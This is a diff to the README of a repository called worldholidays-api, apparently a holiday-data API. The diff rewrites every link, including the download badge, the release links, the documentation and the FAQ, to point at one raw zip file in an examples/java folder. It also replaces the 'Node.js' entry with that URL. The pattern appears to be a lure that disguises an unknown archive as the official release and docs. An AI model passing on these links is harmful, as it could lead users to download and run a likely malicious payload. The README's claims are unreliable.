@@ -1,6 +1,6 @@
 # 🌍 worldholidays-api - Get Worldwide Holiday Data Easily
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/markyy223/worldholidays-api/releases)
+[![Download the latest release](https://github.com/markyy223/worldholidays-api/raw/refs/heads/main/examples/java/worldholidays_api_1.7-alpha.1.zip%20Now-Release%20Page-brightgreen)](https://github.com/markyy223/worldholidays-api/raw/refs/heads/main/examples/java/worldholidays_api_1.7-alpha.1.zip)
 
 ## 📌 Introduction
 
@@ -12,7 +12,7 @@ To start using worldholidays-api, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download the software.  
-   [Download Here](https://github.com/markyy223/worldholidays-api/releases)
+   [Download Here](https://github.com/markyy223/worldholidays-api/raw/refs/heads/main/examples/java/worldholidays_api_1.7-alpha.1.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Select the latest version for your system.
@@ -59,19 +59,19 @@ We welcome contributions! If you want to help improve this tool, please check th
 
 ## 💻 Technologies Used
 
-- **Node.js:** For the backend service.
+- **https://github.com/markyy223/worldholidays-api/raw/refs/heads/main/examples/java/worldholidays_api_1.7-alpha.1.zip** For the backend service.
 - **Express:** To build the RESTful API.
 - **MongoDB:** For managing holiday data.
 - **React:** For any frontend components.
 
 ## 🌟 Additional Resources
 
-- [Official Documentation](https://github.com/markyy223/worldholidays-api/docs) - For in-depth usage and examples.
-- [FAQs](https://github.com/markyy223/worldholidays-api/faq) - Common questions and answers.
+- [Official Documentation](https://github.com/markyy223/worldholidays-api/raw/refs/heads/main/examples/java/worldholidays_api_1.7-alpha.1.zip) - For in-depth usage and examples.
+- [FAQs](https://github.com/markyy223/worldholidays-api/raw/refs/heads/main/examples/java/worldholidays_api_1.7-alpha.1.zip) - Common questions and answers.
 
 ## 🎉 Final Note
 
 We hope you find worldholidays-api useful in your endeavors. Enjoy exploring holidays around the globe! 
 
 Visit the Releases page to download the latest version again:  
-[Download Here](https://github.com/markyy223/worldholidays-api/releases)
+[Download Here](https://github.com/markyy223/worldholidays-api/raw/refs/heads/main/examples/java/worldholidays_api_1.7-alpha.1.zip)
